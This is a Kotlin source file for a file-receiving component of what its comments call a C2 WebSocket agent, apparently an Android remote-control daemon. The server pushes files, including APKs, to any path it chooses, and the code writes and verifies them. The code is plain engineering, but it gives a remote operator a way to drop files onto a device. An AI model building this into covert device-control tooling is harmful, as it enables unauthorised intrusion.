package com.tg.ghostd

import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.util.concurrent.CountDownLatch

/**
 * Incoming file transfer: `files put <path>` — accepts a file stream pushed
 * by the server over the C2 WebSocket and writes it to storage.
 *
 * Flow: the server sends cmd {"action":"files","args":["put","<dest>"]};
 * the command handler starts a transfer ([receive]) and BLOCKS until the
 * server's binary frames arrive (MediaBus framing: JSON header + b'\n' +
 * payload, header type "file_chunk" carries dest path + total len, final
 * "file_end" completes it — as text or as an empty framed binary message).
 * Returns bytes written + sha256 (and verifies sha256 when the server sent
 * one in file_end).
 *
 * Data is written to `<dest>.part` and atomically renamed on success.
 */
object FileReceiver {

    private const val PART_SUFFIX = ".part"

    /** Generous receive window — APKs and media can be hundreds of MB. */
    private const val RECEIVE_TIMEOUT_MS = 10 * 60_000L

    private val lock = Any()
    private var pending: Transfer? = null

    class Transfer internal constructor(val path: String) {
        internal val latch = CountDownLatch(1)
        internal val temp = File(path + PART_SUFFIX)
        internal var out: FileOutputStream? = null
        internal var written = 0L
        internal var chunks = 0L
        internal var total = -1L
        internal var error: String? = null
        internal var sha256: String? = null
        internal val digest = MessageDigest.getInstance("SHA-256")
    }

    /** Called by the command handler for `files put <path>`; blocks. */
    fun receive(path: String): JSONObject {
        if (path.isBlank()) throw Exception("files put: missing destination path")
        val t: Transfer
        synchronized(lock) {
            pending?.let { throw Exception("file transfer already in progress: ${it.path}") }
            t = Transfer(path)
            val parent = File(path).parentFile
            if (parent != null && !parent.exists()) parent.mkdirs()
            t.out = FileOutputStream(t.temp)
            pending = t
        }
        val ok = try {
            t.latch.await(RECEIVE_TIMEOUT_MS, java.util.concurrent.TimeUnit.MILLISECONDS)
        } catch (_: InterruptedException) {
            Thread.currentThread().interrupt()
            false
        }
        if (!ok) {
            fail(t, "timed out after ${RECEIVE_TIMEOUT_MS / 1000}s (got ${t.written} of ${if (t.total < 0) "?" else t.total} bytes)")
        }
        t.error?.let { throw Exception("files put: $it") }
        return JSONObject()
            .put("path", t.path)
            .put("bytes", t.written)
            .put("chunks", t.chunks)
            .put("sha256", t.sha256)
    }

    /** Binary/text file_chunk: header carries path + total len (+seq/len). */
    fun onChunk(header: JSONObject, payload: ByteArray) {
        synchronized(lock) {
            val t = pending ?: return
            if (t.error != null) return
            // Cross-wire guard: a server-side push whose `files put` was
            // rejected still streams chunks; they must NOT land in an
            // unrelated in-flight transfer (seen live: ghosta bytes renamed
            // over ghostd.apk). Chunk headers carry the intended path.
            val chunkPath = header.optString("path", "")
            if (chunkPath.isNotEmpty() && chunkPath != t.path) return
            try {
                val tot = header.optLong("total", -1)
                if (tot > 0) t.total = tot
                t.out?.write(payload)
                t.digest.update(payload)
                t.written += payload.size
                t.chunks++
            } catch (e: Exception) {
                failLocked(t, "write failed: ${e.message}")
            }
        }
    }

    /** Final file_end (text message or empty framed binary). */
    fun onEnd(header: JSONObject) {
        synchronized(lock) {
            val t = pending ?: return
            if (t.error != null) return
            // Cross-wire guard (see onChunk): only accept file_end for OUR path.
            val endPath = header.optString("path", header.optString("dest", ""))
            if (endPath.isNotEmpty() && endPath != t.path) return
            if (t.total > 0 && t.written != t.total) {
                failLocked(t, "size mismatch: got ${t.written} of ${t.total} bytes")
                return
            }
            val expected = header.optString("sha256")
            val got = FileTransfer.toHex(t.digest.digest())
            if (expected.isNotEmpty() && !expected.equals(got, ignoreCase = true)) {
                failLocked(t, "sha256 mismatch: expected $expected got $got")
                return
            }
            closeStream(t)
            val dest = File(t.path)
            if (dest.exists()) dest.delete()
            if (!t.temp.renameTo(dest)) {
                failLocked(t, "rename to ${t.path} failed")
                return
            }
            t.sha256 = got
            t.latch.countDown()
            pending = null
        }
    }

    // ---------------------------------------------------------- internal

    private fun fail(t: Transfer, msg: String) {
        synchronized(lock) { failLocked(t, msg) }
    }

    /** Caller holds [lock]. */
    private fun failLocked(t: Transfer, msg: String) {
        closeStream(t)
        t.temp.delete()
        t.error = msg
        t.latch.countDown()
        if (pending === t) pending = null
    }

    private fun closeStream(t: Transfer) {
        try {
            t.out?.close()
        } catch (_: Exception) {
        }
        t.out = null
    }
}
